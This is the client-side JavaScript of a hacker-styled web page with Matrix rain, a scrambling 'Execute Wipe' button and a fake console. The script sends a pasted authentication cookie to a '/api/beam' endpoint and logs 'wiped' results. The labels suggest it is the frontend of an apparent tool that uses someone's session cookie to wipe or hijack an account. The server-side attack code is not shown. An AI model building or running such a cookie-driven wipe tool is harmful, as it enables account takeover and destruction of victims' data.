    <script>
        const box = document.getElementById('tilt-box');
        document.addEventListener('mousemove', (e) => {
            const x = (window.innerWidth / 2 - e.pageX) / 50;
            const y = (window.innerHeight / 2 - e.pageY) / 50;
            box.style.transform = `rotateY(${x}deg) rotateX(${y}deg) translateZ(0)`;
        });
        document.addEventListener('mouseleave', () => { box.style.transform = `rotateY(0deg) rotateX(0deg) translateZ(0)`; });

        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
        const fontSize = 14; const columns = canvas.width / fontSize; const drops = [];
        for (let x = 0; x < columns; x++) drops[x] = 1;

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff41'; ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = chars.charAt(Math.floor(Math.random() * chars.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 50);
        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });

        const btn = document.getElementById('execute-btn');
        const originalText = "Execute Wipe";
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+";
        let interval = null;

        function scrambleText() {
            let iteration = 0; clearInterval(interval);
            interval = setInterval(() => {
                btn.innerText = btn.innerText.split("").map((letter, index) => {
                    if (index < iteration) return originalText[index];
                    return letters[Math.floor(Math.random() * letters.length)];
                }).join("");
                if (iteration >= originalText.length) clearInterval(interval);
                iteration += 1 / 3;
            }, 30);
        }

        let progressInterval; let progressValue = 0;
        const progressContainer = document.getElementById('progress-container');
        const progressBar = document.getElementById('progress-bar');

        function startProgress() {
            progressContainer.style.display = 'block';
            progressBar.style.background = 'var(--neon-green)';
            progressBar.style.boxShadow = '0 0 10px var(--neon-green)';
            progressValue = 0; progressBar.style.width = '0%';
            progressInterval = setInterval(() => {
                if (progressValue < 90) {
                    progressValue += Math.random() * 8;
                    if (progressValue > 90) progressValue = 90;
                    progressBar.style.width = progressValue + '%';
                }
            }, 200);
        }

        function finishProgress(success) {
            clearInterval(progressInterval);
            progressValue = 100; progressBar.style.width = '100%';
            if (!success) { progressBar.style.background = 'var(--error-red)'; progressBar.style.boxShadow = '0 0 10px var(--error-red)'; }
            setTimeout(() => { progressContainer.style.display = 'none'; progressBar.style.width = '0%'; }, 2500);
        }

        btn.addEventListener('click', async () => {
            const consoleBox = document.getElementById('console');
            const cookie = document.getElementById('cookie').value.trim();
            
            if (!cookie) { logToConsole("[!] ERR: AUTH_COOKIE is empty.", "error"); return; }
            
            btn.disabled = true; scrambleText();
            setTimeout(() => btn.innerText = "EXECUTING...", 400);
            
            consoleBox.innerHTML = ""; 
            logToConsole("[*] Connecting to Vercel API...", "info");
            startProgress();

            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 9000); 
            
            try {
                const response = await fetch('/api/beam', {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie }), signal: controller.signal
                });
                clearTimeout(timeoutId);

                let result;
                try { result = await response.json(); } 
                catch (e) { throw new Error(`Server error ${response.status}`); }
                
                if (response.ok && result.success) {
                    result.data.messages.forEach(msg => {
                        if (msg.includes("success") || msg.includes("wiped")) {
                            logToConsole(`[+] ${msg}`, "success"); 
                        } else {
                            logToConsole(`[-] ${msg}`, "error");
                        }
                    });
                    finishProgress(true);
                } else { 
                    logToConsole(`[-] API ERR: ${result.message || "Unknown error"}`, "error"); 
                    finishProgress(false);
                }
            } catch (error) { 
                if (error.name === 'AbortError') { logToConsole(`[-] FATAL: Vercel dropped connection (10s limit).`, "error"); } 
                else { logToConsole(`[-] NETWORK ERR: ${error.message}`, "error"); }
                finishProgress(false);
            } finally { 
                btn.disabled = false; btn.innerText = "Execute Wipe";
            }
        });
        
        function logToConsole(text, type) {
            const consoleBox = document.getElementById('console');
            const div = document.createElement('div');
            div.className = `line ${type}`; div.innerText = text;
            consoleBox.appendChild(div); 
            const oldCursors = consoleBox.querySelectorAll('.cursor');
            oldCursors.forEach(c => c.remove());
            const cursor = document.createElement('div');
            cursor.className = 'cursor'; div.appendChild(cursor);
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }
    </script>
